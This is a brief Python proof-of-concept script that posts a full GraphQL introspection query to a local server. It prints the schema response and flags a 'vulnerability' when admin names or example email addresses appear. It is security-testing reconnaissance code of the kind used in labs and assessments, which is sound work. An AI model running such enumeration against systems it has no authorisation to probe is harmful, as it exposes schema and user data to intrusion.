#!/usr/bin/env python3
"""PoC: Introspection dump"""
import requests
import json

URL = "http://localhost:5000/graphql"
QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

r = requests.post(URL, json={"query": QUERY}, timeout=10)
print("Status:", r.status_code)
print("Response:", r.text[:800])

if "data" in r.text and ("admin" in r.text.lower() or "@example.com" in r.text):
    print("[!] Vulnerability confirmed")
